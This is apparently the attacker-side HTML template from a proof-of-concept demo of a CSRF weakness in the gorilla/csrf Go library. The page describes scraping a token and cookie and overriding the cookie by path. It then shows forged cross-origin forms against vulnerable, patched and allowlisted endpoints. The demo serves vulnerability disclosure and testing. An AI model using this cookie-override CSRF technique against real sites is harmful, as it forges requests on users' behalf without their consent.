<html>

<head>
    <title>Attacker origin</title>
</head>

<body>
    <h1><code>gorilla/csrf</code> XSS demo</h1>

    <p>This page scrapes the target origin for valid CSRF token & cookie
        values to use for its attack. It sets the cookie for the top level domain of
        the target origin but with a more specific path to override any pre-existing
        The form below has been pre-filled with the scraped
        CSRF token and will successfully submit cross-origin to the target
        application
    </p>
    <hr />
    <code>
        Token: {{ .Token }}<br/>
        Cookie: {{ .Cookie }}<br/>
    </code>

    <hr />

    <h3>Submit CSRF to vulnerable <code>https://target.{{ .Domain }}/submit</code></h3>
    <p>This will be accepted because gorilla/csrf does not check the origin or referer headers</p>
    <form method="post" action="https://target.{{ .Domain }}/submit">
        <input type="hidden" name="gorilla.csrf.Token" value="{{ .Token }}">
        <button type="submit">Submit CSRF</button>
    </form>

    <hr />

    <h3>Submit CSRF to patched <code>https://safe.{{ .Domain }}/submit</code></h3>
    <p>This request is submitted to an endpoint running the patched gorilla/csrf code and will be rejected due to Origin
        validation.
        <a href="https://github.com/patrickod/csrf-demo/blob/main/main.go#L61">View the source code</a>
    </p>

    <form method="post" action="https://safe.{{ .Domain }}/submit">
        <input type="hidden" name="gorilla.csrf.Token" value="{{ .Token }}">
        <button type="submit">Submit CSRF</button>
    </form>

    <hr />

    <h3>Submit CSRF to <code>https://trusted.{{ .Domain }}/submit</code></h3>
    <p>This request is submitted to an endpoint running the patched gorilla/csrf code and will be permitted due to the
        Origin being explicitly trusted in an allowlist.
        <a href="https://github.com/patrickod/csrf-demo/blob/main/main.go#L65-L69">View the source code</a>
    </p>

    <form method="post" action="https://trusted.{{ .Domain }}/submit">
        <input type="hidden" name="gorilla.csrf.Token" value="{{ .Token }}">
        <button type="submit">Submit CSRF</button>
    </form>
</body>

</html>
